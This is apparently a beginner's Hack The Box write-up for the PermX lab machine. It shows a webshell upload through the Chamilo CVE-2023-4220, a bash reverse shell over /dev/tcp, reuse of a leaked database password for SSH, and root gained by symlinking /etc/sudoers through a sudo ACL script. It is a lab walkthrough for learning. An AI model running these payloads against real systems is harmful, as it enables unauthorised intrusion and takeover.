---
layout: post
title: Hackthebox PermX Machine Writeup
tags: [Revershell, Privilege Escalation, Recon]
description: Detailed writeup of [PermX](https://app.hackthebox.com/machines/PermX)
---



<div style="display: flex; justify-content: center;">
  <img src="/assets/HTB/banner.png" alt="HTB Banner" style="max-width: 100%; height: auto; text-align: center;">
</div>

### Overview
[PermX](https://app.hackthebox.com/machines/PermX) focuses on Linux permissions, starting with Chamilo's file upload leading to shell access. Using shared credentials for lateral movement, followed by ACL abuse through symlinks to gain root - with multiple successful and failed paths explored for maximum learning.

### (CVE-2023-4220) Chamilo LMS Unauthenticated Big Upload File Remote Code Execution

- OS	Linux Linux
- Base Points	Easy [20]

## Recon
### nmap
```
angrybird@angrybird$ nmap -p- -sC -sV $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-06 21:38 EDT
Nmap scan report for $ip
Host is up (0.087s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://permx.htb
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.82 seconds
```

```
echo "$ip permx.htb" | sudo tee -a /etc/hosts
```

### Subdomain Fuzzing

- FUZZ for subdomain's, I got nothing in permx.htb
```
ffuf -u $ip -H "Host: FUZZ.permx.htb" -w /subdomains-top1million-20000.txt -ac

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 88ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 122ms]
```

- I’ll add the base domain as well as both subdomains to my /etc/hosts file:

```
$ip permx.htb www.permx.htb lms.permx.htb
```
- After some fuzzing on both subdomains The base domain and the www subdomain seem to return the same page.


#### lms.permx.htb
This site has a login form for an instance of Chamilo.

Chamilo is a PHP-based online training platform. It is also hosted on [GitHub](https://github.com/chamilo/chamilo-lms). I had observed README.md file. I read content on http://lms.permx.htb/README.md & documentation. I observed version is on There are references to the 1.11.x.

Review of CVE Details indicates multiple vulnerabilities affecting versions through 1.11.XX. Based on the version information from PermX, several of these security issues may be applicable and warrant version verification.

[CVE-2023-4220](https://nvd.nist.gov/vuln/detail/CVE-2023-4220), [MyScript](https://github.com/oxapavan/CVE-2023-4220-HTB-PermX) enables RCE through unsanitized file uploads in the /main/inc/lib/javascript/bigupload/files directory. While labeled as XSS in the [StarLabs advisory](https://starlabs.sg/advisories/23/23-4220/), the core issue is inadequate upload validation allowing arbitrary PHP files. Testing confirms the vulnerable directory exists on PermX. That Felt something similar to lab machine.



- I’ll test the webshell by uploading cmd chell :-
  ```
  echo '<?php system($_GET["cmd"]); ?>' > test.php

  curl -F 'bigUploadFile=@test.php''http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
  The file has successfully been uploaded.

  curl http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/test.php?cmd=id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

## shell

To establish a reverse shell, we first set up a Netcat listener with -l (listen mode), -n (prevent DNS resolution), -v (verbose), and -p 4455 (port specification).
Next, we create rev.php containing PHP code that triggers a reverse shell connection from the target server back to our machine, executing bash -c to spawn an interactive shell.

```
echo '<?php system("bash -c '\''bash -i >& /dev/tcp/$ip/4444 0>&1'\''");?>' > reverseshell.php
```
After receiving confirmation of successful file upload, we issue a GET request to rev.php. This execution triggers the reverse shell connection back to our waiting Netcat listener.
```
nc -lnvp 4444


curl -F 'bigUploadFile=@reverseshell.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
The file has successfully been uploaded.

curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/reverseshell.php'
```

Our Netcat listener shows a successful connection  port, confirming shell access. We're now operating with www-data privileges, enabling server interaction under this user context.


```
nc -lnvp 4455
listening on [any] 4455 ...
connect to [$ip] from (UNKNOWN) [$ip] port
bash: cannot set terminal process group (1174): Inappropriate ioctl for device
bash: no job control in this shell
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$
```

After some struggle i got this files
```
www-data@permx:/var/www$ ls chamilo/
CODE_OF_CONDUCT.md  README.md             bin           cli-config.php  composer.lock  favicon.ico  license.txt    plugin      terms.php     vendor       whoisonline.php
CONTRIBUTING.md     app                   bower.json    codesize.xml    custompages    favicon.png  main           robots.txt  user.php      web          whoisonlinesession.php
LICENSE             apple-touch-icon.png  certificates  composer.json   documentation  index.php    news_list.php  src         user_portal.phpweb.config
```
I checked /cli-config.php file nothing intresting but i got **$configurationFile = __DIR__.'/app/config/configuration.php';** via cli-config.php file.

There is some config data
```
// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
..........................
..........................
```

Upon trying to log in via SSH as the user mtz using the database password we found earlier, we see that this works.

```
ssh mtz@permx.htb
The authenticity of host 'permx.htb ' can't be established.
ED25519 key fingerprint is SHA256:u9/wL+62dkDBqxAG3NyMhz/2FTBJlmVC1Y1bwaNLqGA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'permx.htb' (ED25519) to the list of known hosts.
mtz@permx.htb's password:03F6lY3uXAP2bkW8
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)
* Documentation: https://help.ubuntu.com
* Management: https://landscape.canonical.com
* Support: https://ubuntu.com/pro
mtz@permx:~$
```

& Here i can read user.txt - ***********************

- There isn’t anything of interest in mtz’s home directory:

Here **Privilege Escalation** raises.

Sudo permission enumeration reveals mtz can run /opt/acl.sh with unrestricted user impersonation (ALL) and without password authentication, suggesting a clear privilege escalation path.


```
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/
snap/bin, use_pty
User mtz may run the following commands on permx:
(ALL : ALL) NOPASSWD: /opt/acl.sh
mtz@permx:~$
```

whatttttt acl.sh ????

```
mtz@permx:~$ cat /opt/acl.sh
#!/bin/bash
if [ "$#" -ne 3 ]; then
/usr/bin/echo "Usage: $0 user perm file"
exit 1
fi
user="$1"
perm="$2"
target="$3"
if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
/usr/bin/echo "Access denied."
exit 1
fi
# Check if the path is a file
if [ ! -f "$target" ]; then
/usr/bin/echo "Target must be a file."
exit 1
fi
/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
mtz@permx:~$
```

Analysis of /opt/acl.sh reveals it modifies file ACLs after basic path validation to prevent traversal. We can exploit this SUID script by creating a symbolic link named 'root' in mtz's home directory pointing to /etc/sudoers, potentially enabling privilege escalation.

```
mtz@permx:~$ ln -s /etc/sudoers root
```

Using acl.sh, we grant ourselves (mtz) read/write permissions on our symbolic link, effectively gaining access to modify /etc/sudoers through the link.

```
mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/root
```

We then append a new sudoers entry through our symbolic link, granting mtz unrestricted sudo access without password requirements.

```
mtz@permx:~$ echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" >> /home/mtz/root
```
With our modified sudoers entry in place, we execute 'sudo bash' to obtain a root shell with full system privileges

```
mtz@permx:~$ sudo bash
root@permx:/home/mtz# id
uid=0(root) gid=0(root) groups=0(root)
```

We can now proceed to grab the root flag. 

```
root@permx:/home/mtz# cat /root/root.txt
**************************
root@permx:/home/mtz#
````




This is my first HTB Writeup 😅
